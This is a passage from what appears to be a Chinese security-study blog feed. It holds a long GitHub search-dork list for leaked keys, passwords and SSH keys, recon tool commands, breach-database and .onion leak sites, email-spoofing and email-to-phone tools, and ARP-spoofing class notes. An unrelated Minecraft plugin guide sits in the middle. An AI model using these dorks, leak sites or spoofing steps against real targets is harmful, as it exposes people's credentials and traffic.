class="line">&quot;dotfiles&quot;</span><br><span class="line">&quot;encryption_key&quot;</span><br><span class="line">&quot;fabricApiSecret&quot;</span><br><span class="line">&quot;fb_secret&quot;</span><br><span class="line">&quot;firebase&quot;</span><br><span class="line">&quot;ftp&quot;</span><br><span class="line">&quot;gh_token&quot;</span><br><span class="line">&quot;github_key&quot;</span><br><span class="line">&quot;github_token&quot;</span><br><span class="line">&quot;gitlab&quot;</span><br><span class="line">&quot;gmail_password&quot;</span><br><span class="line">&quot;gmail_username&quot;</span><br><span class="line">&quot;herokuapp&quot;</span><br><span class="line">&quot;internal&quot;</span><br><span class="line">&quot;irc_pass&quot;</span><br><span class="line">&quot;JEKYLL_GITHUB_TOKEN&quot;</span><br><span class="line">&quot;key&quot;</span><br><span class="line">&quot;keyPassword&quot;</span><br><span class="line">&quot;ldap_password&quot;</span><br><span class="line">&quot;ldap_username&quot;</span><br><span class="line">&quot;login&quot;</span><br><span class="line">&quot;mailchimp&quot;</span><br><span class="line">&quot;mailgun&quot;</span><br><span class="line">&quot;master_key&quot;</span><br><span class="line">&quot;mydotfiles&quot;</span><br><span class="line">&quot;mysql&quot;</span><br><span class="line">&quot;node_env&quot;</span><br><span class="line">&quot;npmrc _auth&quot;</span><br><span class="line">&quot;oauth_token&quot;</span><br><span class="line">&quot;pass&quot;</span><br><span class="line">&quot;passwd&quot;</span><br><span class="line">&quot;password&quot;</span><br><span class="line">&quot;passwords&quot;</span><br><span class="line">&quot;pem private&quot;</span><br><span class="line">&quot;preprod&quot;</span><br><span class="line">&quot;private_key&quot;</span><br><span class="line">&quot;prod&quot;</span><br><span class="line">&quot;pwd&quot;</span><br><span class="line">&quot;pwds&quot;</span><br><span class="line">&quot;rds.amazonaws.com password&quot;</span><br><span class="line">&quot;redis_password&quot;</span><br><span class="line">&quot;root_password&quot;</span><br><span class="line">&quot;secret&quot;</span><br><span class="line">&quot;secret.password&quot;</span><br><span class="line">&quot;secret_access_key&quot;</span><br><span class="line">&quot;secret_key&quot;</span><br><span class="line">[WFClient] Password= extension:ica</span><br><span class="line">access_key</span><br><span class="line">bucket_password</span><br><span class="line">dbpassword</span><br><span class="line">dbuser</span><br><span class="line">extension:avastlic &quot;support.avast.com&quot;</span><br><span class="line">extension:bat</span><br><span class="line">extension:cfg</span><br><span class="line">extension:env</span><br><span class="line">extension:exs</span><br><span class="line">extension:ini</span><br><span class="line">extension:json api.forecast.io</span><br><span class="line">extension:json googleusercontent client_secret</span><br><span class="line">extension:json mongolab.com</span><br><span class="line">extension:pem</span><br><span class="line">extension:pem private</span><br><span class="line">extension:ppk</span><br><span class="line">extension:ppk private</span><br><span class="line">extension:properties</span><br><span class="line">extension:sh</span><br><span class="line">extension:sls</span><br><span class="line">extension:sql</span><br><span class="line">extension:sql mysql dump</span><br><span class="line">extension:sql mysql dump password</span><br><span class="line">extension:yaml mongolab.com</span><br><span class="line">extension:zsh</span><br><span class="line">filename:.bash_history</span><br><span class="line">filename:.bash_history DOMAIN-NAME</span><br><span class="line">filename:.bash_profile aws</span><br><span class="line">filename:.bashrc mailchimp</span><br><span class="line">filename:.bashrc password</span><br><span class="line">filename:.cshrc</span><br><span class="line">filename:.dockercfg auth</span><br><span class="line">filename:.env DB_USERNAME NOT homestead</span><br><span class="line">filename:.env MAIL_HOST=smtp.gmail.com</span><br><span class="line">filename:.esmtprc password</span><br><span class="line">filename:.ftpconfig</span><br><span class="line">filename:.git-credentials</span><br><span class="line">filename:.history</span><br><span class="line">filename:.htpasswd</span><br><span class="line">filename:.netrc password</span><br><span class="line">filename:.npmrc _auth</span><br><span class="line">filename:.pgpass</span><br><span class="line">filename:.remote-sync.json</span><br><span class="line">filename:.s3cfg</span><br><span class="line">filename:.sh_history</span><br><span class="line">filename:.tugboat NOT _tugboat</span><br><span class="line">filename:_netrc password</span><br><span class="line">filename:apikey</span><br><span class="line">filename:bash</span><br><span class="line">filename:bash_history</span><br><span class="line">filename:bash_profile</span><br><span class="line">filename:bashrc</span><br><span class="line">filename:beanstalkd.yml</span><br><span class="line">filename:CCCam.cfg</span><br><span class="line">filename:composer.json</span><br><span class="line">filename:config</span><br><span class="line">filename:config irc_pass</span><br><span class="line">filename:config.json auths</span><br><span class="line">filename:config.php dbpasswd</span><br><span class="line">filename:configuration.php JConfig password</span><br><span class="line">filename:connections</span><br><span class="line">filename:connections.xml</span><br><span class="line">filename:constants</span><br><span class="line">filename:credentials</span><br><span class="line">filename:credentials aws_access_key_id</span><br><span class="line">filename:cshrc</span><br><span class="line">filename:database</span><br><span class="line">filename:dbeaver-data-sources.xml</span><br><span class="line">filename:deployment-config.json</span><br><span class="line">filename:dhcpd.conf</span><br><span class="line">filename:dockercfg</span><br><span class="line">filename:environment</span><br><span class="line">filename:express.conf</span><br><span class="line">filename:express.conf path:.openshift</span><br><span class="line">filename:filezilla.xml</span><br><span class="line">filename:filezilla.xml Pass</span><br><span class="line">filename:git-credentials</span><br><span class="line">filename:gitconfig</span><br><span class="line">filename:global</span><br><span class="line">filename:history</span><br><span class="line">filename:htpasswd</span><br><span class="line">filename:hub oauth_token</span><br><span class="line">filename:id_dsa</span><br><span class="line">filename:id_rsa</span><br><span class="line">filename:id_rsa or filename:id_dsa</span><br><span class="line">filename:idea14.key</span><br><span class="line">filename:known_hosts</span><br><span class="line">filename:logins.json</span><br><span class="line">filename:makefile</span><br><span class="line">filename:master.key path:config</span><br><span class="line">filename:netrc</span><br><span class="line">filename:npmrc</span><br><span class="line">filename:pass</span><br><span class="line">filename:passwd path:etc</span><br><span class="line">filename:pgpass</span><br><span class="line">filename:prod.exs</span><br><span class="line">filename:prod.exs NOT prod.secret.exs</span><br><span class="line">filename:prod.secret.exs</span><br><span class="line">filename:proftpdpasswd</span><br><span class="line">filename:recentservers.xml</span><br><span class="line">filename:recentservers.xml Pass</span><br><span class="line">filename:robomongo.json</span><br><span class="line">filename:s3cfg</span><br><span class="line">filename:secrets.yml password</span><br><span class="line">filename:server.cfg</span><br><span class="line">filename:server.cfg rcon password</span><br><span class="line">filename:settings</span><br><span class="line">filename:settings.py SECRET_KEY</span><br><span class="line">filename:sftp-config.json</span><br><span class="line">filename:sftp-config.json password</span><br><span class="line">filename:sftp.json path:.vscode</span><br><span class="line">filename:shadow</span><br><span class="line">filename:shadow path:etc</span><br><span class="line">filename:spec</span><br><span class="line">filename:sshd_config</span><br><span class="line">filename:token</span><br><span class="line">filename:tugboat</span><br><span class="line">filename:ventrilo_srv.ini</span><br><span class="line">filename:WebServers.xml</span><br><span class="line">filename:wp-config</span><br><span class="line">filename:wp-config.php</span><br><span class="line">filename:zhrc</span><br><span class="line">HEROKU_API_KEY language:json</span><br><span class="line">HEROKU_API_KEY language:shell</span><br><span class="line">HOMEBREW_GITHUB_API_TOKEN language:shell</span><br><span class="line">jsforce extension:js conn.login</span><br><span class="line">language:yaml -filename:travis</span><br><span class="line">msg nickserv identify filename:config</span><br><span class="line">org:Target &quot;AWS_ACCESS_KEY_ID&quot;</span><br><span class="line">org:Target &quot;list_aws_accounts&quot;</span><br><span class="line">org:Target &quot;aws_access_key&quot;</span><br><span class="line">org:Target &quot;aws_secret_key&quot;</span><br><span class="line">org:Target &quot;bucket_name&quot;</span><br><span class="line">org:Target &quot;S3_ACCESS_KEY_ID&quot;</span><br><span class="line">org:Target &quot;S3_BUCKET&quot;</span><br><span class="line">org:Target &quot;S3_ENDPOINT&quot;</span><br><span class="line">org:Target &quot;S3_SECRET_ACCESS_KEY&quot;</span><br><span class="line">password</span><br><span class="line">path:sites databases password</span><br><span class="line">private -language:java</span><br><span class="line">PT_TOKEN language:bash</span><br><span class="line">redis_password</span><br><span class="line">root_password</span><br><span class="line">secret_access_key</span><br><span class="line">SECRET_KEY_BASE=</span><br><span class="line">shodan_api_key language:python</span><br><span class="line">WORDPRESS_DB_PASSWORD=</span><br><span class="line">xoxp OR xoxb OR xoxa</span><br><span class="line">s3.yml</span><br><span class="line">.exs</span><br><span class="line">beanstalkd.yml</span><br><span class="line">deploy.rake</span><br><span class="line">.sls</span><br><span class="line">— — — — — -BASH — — — — — — — — — —</span><br><span class="line">language:bash password</span><br><span class="line">language:bash pwd</span><br><span class="line">language:bash ftp</span><br><span class="line">language:bash dotfiles</span><br><span class="line">language:bash JDBC</span><br><span class="line">language:bash key-keys</span><br><span class="line">language:bash send_key-keys</span><br><span class="line">language:bash send,key-keys</span><br><span class="line">language:bash token</span><br><span class="line">language:bash user</span><br><span class="line">language:bash login-singin</span><br><span class="line">language:bash passkey-passkeys</span><br><span class="line">language:bash pass</span><br><span class="line">language:bash secret</span><br><span class="line">language:bash credentials</span><br><span class="line">language:bash config</span><br><span class="line">language:bash security_credentials</span><br><span class="line">language:bash connectionstring</span><br><span class="line">language:bash ssh2_auth_password</span><br><span class="line">— — — — — — — — — — — — — — — — — — -PYTHON — — — — — — — — —</span><br><span class="line">language:python password</span><br><span class="line">language:python pwd</span><br><span class="line">language:python ftp</span><br><span class="line">language:python dotfiles</span><br><span class="line">language:python JDBC</span><br><span class="line">language:python key-keys</span><br><span class="line">language:python send_key-keys</span><br><span class="line">language:python send,key-keys</span><br><span class="line">language:python token</span><br><span class="line">language:python user</span><br><span class="line">language:python login-singin</span><br><span class="line">language:python passkey-passkeys</span><br><span class="line">language:python pass</span><br><span class="line">language:python secret</span><br><span class="line">language:python credentials</span><br><span class="line">language:python config</span><br><span class="line">language:python security_credentials</span><br><span class="line">language:python connectionstring</span><br><span class="line">language:python ssh2_auth_password</span><br><span class="line"></span><br><span class="line">org:facebookresearch https://</span><br><span class="line">org:facebookresearch http://</span><br><span class="line">org:facebookresearch ldap</span><br><span class="line">org:facebookresearch ftp</span><br><span class="line">org:facebookresearch sftp</span><br><span class="line">org:facebookresearch host:</span><br><span class="line">org:facebookresearch login</span><br></pre></td></tr></table></figure><h3 id="asncider-tools"><a href="#asncider-tools" class="headerlink" title="asncider-tools"></a>asncider-tools</h3><p>asn/cidr<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">使用 ASN 信息快速映射组织网络范围的 Go CLI 和库</span><br><span class="line"># Company string name to CIDR</span><br><span class="line"># https://github.com/dhn/spk</span><br><span class="line">spk -json -s &quot;Google&quot;</span><br><span class="line"></span><br><span class="line"># Versatile tool with multiple input options and output formats</span><br><span class="line"># https://github.com/projectdiscovery/asnmap</span><br><span class="line">asnmap -i 1.3.3.7 -org GOOGLE -d facebook.com,twitter.com -a AS394161</span><br><span class="line"></span><br><span class="line"># https://github.com/nitefood/asn</span><br><span class="line">asn -n 8.8.8.8</span><br><span class="line"></span><br><span class="line"># https://github.com/j3ssie/metabigor</span><br><span class="line">echo &quot;company&quot; | metabigor net --org</span><br><span class="line">echo &quot;ASN1111&quot; | metabigor net --asn</span><br><span class="line"></span><br><span class="line"># https://github.com/yassineaboukir/Asnlookup</span><br><span class="line">python asnlookup.py -m -o &lt;Organization&gt;</span><br><span class="line"></span><br><span class="line"># https://github.com/harleo/asnip</span><br><span class="line">asnip -t domain.com -p</span><br><span class="line"></span><br><span class="line"># https://github.com/projectdiscovery/mapcidr</span><br><span class="line">echo 10.10.10.0/24 | mapcidr</span><br><span class="line"></span><br><span class="line"># https://github.com/eslam3kl/3klector</span><br><span class="line">python 3klector.py -t company</span><br><span class="line"></span><br><span class="line"># https://github.com/SpiderLabs/HostHunter</span><br><span class="line">python3 hosthunter.py targets.txt</span><br><span class="line"></span><br><span class="line"># Website (with API)</span><br><span class="line">https://asnlookup.com/</span><br></pre></td></tr></table></figure></p><p>证书泄露<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># pwndb</span><br><span class="line"># https://github.com/davidtavarez/pwndb</span><br><span class="line">python3 pwndb.py --target asd@asd.com</span><br><span class="line"></span><br><span class="line"># Websites</span><br><span class="line">https://link-base.org/index.php</span><br><span class="line">http://xjypo5vzgmo7jca6b322dnqbsdnp3amd24ybx26x5nxbusccjkm4pwid.onion/</span><br><span class="line">http://pwndb2am4tzkvold.onion</span><br><span class="line">https://weleakinfo.to/</span><br><span class="line">https://www.dehashed.com/search?query=</span><br><span class="line">https://haveibeenpwned.com</span><br><span class="line">https://breachchecker.com</span><br><span class="line">https://vigilante.pw/</span><br><span class="line">https://leak.sx/</span><br><span class="line">https://intelx.io</span><br><span class="line">https://search.illicit.services/</span><br><span class="line">https://breachdirectory.org/</span><br><span class="line"></span><br><span class="line">breachdirectory.org + (hashes.com || md5decrypt.net || crackstation.net)# Nice combination</span><br><span class="line"></span><br><span class="line"># Check hashes with this tool</span><br><span class="line">https://github.com/jackrendor/jhf</span><br></pre></td></tr></table></figure></p><p>电子邮件工具<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"># https://github.com/SimplySecurity/SimplyEmail</span><br><span class="line">./SimplyEmail.py</span><br><span class="line"></span><br><span class="line">pip3 install mailspoof</span><br><span class="line">sudo mailspoof -d domain.com</span><br><span class="line"></span><br><span class="line"># Test email spoof</span><br><span class="line">https://emkei.cz/</span><br><span class="line"></span><br><span class="line"># Find emails in an org</span><br><span class="line">https://hunter.io</span><br><span class="line">https://snov.io/email-finder</span><br><span class="line">https://app.snov.io/domain-search</span><br><span class="line">https://hunter.io/</span><br><span class="line"></span><br><span class="line"># https://github.com/sham00n/buster</span><br><span class="line">buster -e target@example.com</span><br><span class="line"></span><br><span class="line"># https://github.com/m4ll0k/Infoga</span><br><span class="line">python infoga.py</span><br><span class="line"></span><br><span class="line"># https://github.com/martinvigo/email2phonenumber</span><br><span class="line">python email2phonenumber.py scrape -e target@email.com</span><br><span class="line"></span><br><span class="line"># https://github.com/jkakavas/creepy/</span><br><span class="line"></span><br><span class="line"># https://github.com/Josue87/EmailFinder</span><br><span class="line">emailfinder -d domain.com</span><br><span class="line"></span><br><span class="line"># https://github.com/laramies/theHarvester</span><br><span class="line">python3 theHarvester.py -d domain.com -b &quot;linkedin&quot;</span><br></pre></td></tr></table></figure></p><p>GIT工具<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># https://github.com/obheda12/GitDorker</span><br><span class="line">python3 GitDorker.py -tf TOKENSFILE -q tesla.com -d dorks/DORKFILE -o target</span><br><span class="line"></span><br><span class="line"># https://github.com/dxa4481/truffleHog</span><br><span class="line">trufflehog https://github.com/Plazmaz/leaky-repo</span><br><span class="line">trufflehog --regex --entropy=False https://github.com/Plazmaz/leaky-repo</span><br><span class="line"></span><br><span class="line"># https://github.com/eth0izzle/shhgit</span><br><span class="line">shhgit --search-query AWS_ACCESS_KEY_ID=AKIA</span><br><span class="line"></span><br><span class="line"># https://github.com/d1vious/git-wild-hunt</span><br><span class="line">python git-wild-hunt.py -s &quot;extension:json filename:creds language:JSON&quot;</span><br><span class="line"></span><br><span class="line"># https://shhgit.darkport.co.uk/</span><br><span class="line"></span><br><span class="line"># GitLab (API token required)</span><br><span class="line"># https://github.com/codeEmitter/token-hunter</span><br><span class="line">./token-hunter.py -g 123456</span><br></pre></td></tr></table></figure></p><p>社交媒体<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"># Twitter</span><br><span class="line"># https://github.com/twintproject/twint</span><br><span class="line">twint -u username</span><br><span class="line"></span><br><span class="line"># Google account</span><br><span class="line"># https://github.com/mxrch/ghunt</span><br><span class="line">python hunt.py myemail@gmail.com</span><br><span class="line"></span><br><span class="line"># Instagram</span><br><span class="line"># https://github.com/th3unkn0n/osi.ig</span><br><span class="line">python3 main.py -u username</span><br><span class="line"></span><br><span class="line"># Public GDrive docs</span><br><span class="line">https://www.dedigger.com/#gsc.tab=0</span><br><span class="line"></span><br><span class="line"># Websites</span><br><span class="line">emailrep.io # Accounts registered by email</span><br><span class="line">tinfoleak.com # Twitter</span><br><span class="line">mostwantedhf.info # Skype</span><br><span class="line">searchmy.bio # Instagram</span><br><span class="line">search.carrot2.org # Results grouped by topic</span><br><span class="line">boardreader.com # forums</span><br><span class="line">searchcode.com # search by code in repositories</span><br><span class="line">swisscows.com # semantic search engine</span><br><span class="line">publicwww.com # search by source page code</span><br><span class="line">psbdmp.ws # search in pastebin</span><br><span class="line">kribrum.io # social-media search engine</span><br><span class="line">whatsmyname.app</span><br></pre></td></tr></table></figure></p><p>元数据<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># https://github.com/Josue87/MetaFinder</span><br><span class="line">metafinder -d &quot;domain.com&quot; -l 10 -go -bi -ba -o united</span><br></pre></td></tr></table></figure></p><h2 id="special-tools"><a href="#special-tools" class="headerlink" title="special-tools"></a>special-tools</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">决议</span><br><span class="line"></span><br><span class="line">http://dnsbin.zhack.ca/ (DNS)</span><br><span class="line">http://pingb.in/ (DNS)</span><br><span class="line">https://www.mockbin.org/ (HTTP)</span><br><span class="line"></span><br><span class="line">通配符 DNS</span><br><span class="line"></span><br><span class="line">http://xip.io/</span><br><span class="line"></span><br><span class="line">10.0.0.1.xip.io</span><br><span class="line">www.10.0.0.1.xip.io</span><br><span class="line">mysite.10.0.0.1.xip.io</span><br><span class="line">foo.bar.10.0.0.1.xip.io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://nip.io/</span><br><span class="line"></span><br><span class="line">10.0.0.1.nip.io</span><br><span class="line">app.10.0.0.1.nip.io</span><br><span class="line">customer1.app.10.0.0.1.nip.io</span><br><span class="line">customer2.app.10.0.0.1.nip.io</span><br><span class="line">otherapp.10.0.0.1.nip.io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">others</span><br><span class="line"></span><br><span class="line">https://spyse.com/（全面侦察服务）</span><br><span class="line">https://dnsdumpster.com/ （DNS 和子域重组）</span><br><span class="line">反向 IP 查询（Domainmonitor）</span><br><span class="line">安全标头（安全报告、标头丢失）</span><br><span class="line">http://threatcrowd.org/ （WHOIS、DNS、电子邮件和子域重组）</span><br><span class="line">https://mxtoolbox.com/ （多种 DNS 相关重组工具）</span><br><span class="line">https://publicwww.com/ （源代码搜索引擎）</span><br><span class="line">http://ipv4info.com/ （在公司/组织拥有的 IP 块中查找域名）</span><br><span class="line">HackerTarget 工具（DNS 重组、网站查询和扫描工具）</span><br><span class="line">VirusTotal（WHOIS、DNS 和子域侦察）</span><br><span class="line">crt.sh（SSL 证书搜索）</span><br><span class="line">谷歌 CT（SSL 证书透明度搜索）</span><br><span class="line">PenTest 工具（Google ）</span><br><span class="line">Wayback Machine（查找过去在该域名上托管的内容）</span><br><span class="line">查找子域（使用域或关键字查找子域）</span><br></pre></td></tr></table></figure><h2 id="graphql-api"><a href="#graphql-api" class="headerlink" title="graphql-api"></a>graphql-api</h2><p>graph是api中一种查询语言，可以用来查询和操作数据，是一种强类型的语言，可以用来描述数据的结构和操作数据的方式，是一种类似于json的语言，但是比json更加强大，可以用来描述数据的结构和操作数据的方式。<br><a href="https://xz.aliyun.com/t/14913?time__1311=GqAh0KAKDKYIK0y49DyDIgQDRlUGCYbfAeD">【翻译】GraphQL API 漏洞的常见攻击方法总结</a></p><p><img src="https://pic1.imgdb.cn/item/6785ca76d0e0a243d4f40e37.gif" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 知识梳理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Holograms插件快速入门指南</title>
      <link href="/2024/04/10/Holograms%E6%8F%92%E4%BB%B6%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/"/>
      <url>/2024/04/10/Holograms%E6%8F%92%E4%BB%B6%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<div class="note orange no-icon flat"><p>Holograms插件是经典的悬浮字插件，更多功能详见官网。🎐🎐</p></div><div class="tag link"><a class="link-card" title="Holograms" href="https://www.spigotmc.org/resources/decentholograms-1-8-1-20-4-papi-support-no-dependencies.96927/ ✨✨"><div class="left"><img src="https://blogpic-5qb.pages.dev/img/avatar/holograms.png"/></div><div class="right"><p class="text">Holograms</p><p class="url">https://www.spigotmc.org/resources/decentholograms-1-8-1-20-4-papi-support-no-dependencies.96927/ ✨✨</p></div></a></div><hr><ul><li>&lt;&gt;    必需参数。</li><li>[]    可选参数。</li><li>{}    可能值的列表。</li></ul><hr><ul><li>创建  /dh create <name> [initial content]</li></ul><hr><ul><li>添加一行  /dh line add <hologram> <page> <content></li><li>设置一行  /dh line set <hologram> <page> <line> <content></li><li>移除一行  /dh line remove <hologram> <page> <line></li></ul><hr><ul><li>加一页      /dh page add <hologram> [initial content]</li><li>删除一页  /dh page remove <hologram> <page></li><li>查看一页  /dh page switch <hologram> <page></li></ul><hr><ul><li>要允许玩家在页面之间导航，您可以简单地执行以下操作：</li><li>/dh page addaction example 1 RIGHT NEXT_PAGE</li><li>/dh page addaction example 2 LEFT PREV_PAGE</li></ul><hr><ul><li>DecentHolograms 中的渐变使用以下格式定义：</li><li><p>&lt;#00FFFF&gt;&amp;l&amp;nDECENT HOLOGRAMS&lt;/#FF00FF&gt;</p></li><li><p>DecentHolograms 中的彩虹渐变使用以下格式定义：</p></li><li><p><RAINBOW1>Rainbow Text&lt;/RAINBOW&gt;/</p></li><li><p>/dh h center <hologram></p></li><li><p>将全息影像移动到块的当前 X 和 Z 位置的中心。</p></li><li><p>/dh h movehere <hologram></p></li><li>别名：mvhr</li><li>将给定的全息影像传送到您的位置。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Minecraft服务器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Minecraft服务器 </tag>
            
            <tag> Holograms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络渗透测试</title>
      <link href="/2023/12/11/2023%E5%B9%B412%E6%9C%8811%E6%97%A5-%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95CH7/"/>
      <url>/2023/12/11/2023%E5%B9%B412%E6%9C%8811%E6%97%A5-%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95CH7/</url>
      
        <content type="html"><![CDATA[<p>emmm，这节课好像没什么笔记，就简单的写一下nmap的使用以及实验中使用两个虚拟机进行arp欺骗</p><h4 id="nmap上帝之眼的使用"><a href="#nmap上帝之眼的使用" class="headerlink" title="nmap上帝之眼的使用"></a>nmap上帝之眼的使用</h4><p>nmap -O </p><p>NMAP -sS</p><h5 id="使用两台虚拟机进行arp欺骗"><a href="#使用两台虚拟机进行arp欺骗" class="headerlink" title="使用两台虚拟机进行arp欺骗"></a>使用两台虚拟机进行arp欺骗</h5><p>上来先安装</p><p>apt install arpscoof</p><p>如果不成功的话进行换源就好了）</p><p>查看是否安装成功</p><p>arpspoof -h</p><p>提示是arpspoof -i 网卡 -t 要攻击的主机ip -r要攻击的主机的默认网关</p><p>我使用的是使用两个虚拟机进行操作</p><p>这时候需要进行端口转发使得能正常使用。</p><p>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> knowledge </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络渗透测试</title>
      <link href="/2023/12/05/2023%E5%B9%B412%E6%9C%885%E6%97%A5-%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95CH5/"/>
      <url>/2023/12/05/2023%E5%B9%B412%E6%9C%885%E6%97%A5-%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95CH5/</url>
      
        <content type="html"><![CDATA[<p>上周因为考试咕咕了，这次补上（）</p><p>数据链路只在两个结点</p><p><a href="https://imgse.com/i/picZDmR"><img src="https://z1.ax1x.com/2023/12/06/picZDmR.png" alt="picZDmR.png"></a><br><a href="https://imgse.com/i/picZw6J"><img src="https://z1.ax1x.com/2023/12/06/picZw6J.png" alt="picZw6J.png"></a></p><p>信息封装过程：</p><p><a href="https://imgse.com/i/picZ0X9"><img src="https://z1.ax1x.com/2023/12/06/picZ0X9.png" alt="picZ0X9.png"></a></p><p>HTTP：超文本传输协议</p><p>路由器可以被看成是一台计算机而交换机可以堪称线</p><p>问：怎么知道网关MAC地址</p><p>ARP广播）</p><p>封装时的类型</p><p>0x0800  IP</p><p>0x0806  ARP</p><p>DHCP动态主机配置协议</p><p>DHCP 和DNS协议是在应用层，用UDP</p><p>Ip,子网掩码，DNS服务器，默认网关</p><p>源端口0.0.0.0———————》255.255.255。255</p><p>​            DHCP客户端                                DHCP服务器</p><p>​                                        ——广播—-》</p><p>​                                        《—-单播—-</p><p>可进行的攻击</p><p>ARP假冒</p><p>ARP断网攻击</p><p>制作钓鱼网站</p><p>伪造DNS</p><p>假冒客户端耗尽资源池（死亡之Ping）</p><p>非法冒充DHCP</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> knowledge </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络渗透测试</title>
      <link href="/2023/12/04/2023%E5%B9%B412%E6%9C%884%E6%97%A5-%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95CH6/"/>
      <url>/2023/12/04/2023%E5%B9%B412%E6%9C%884%E6%97%A5-%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95CH6/</url>
      
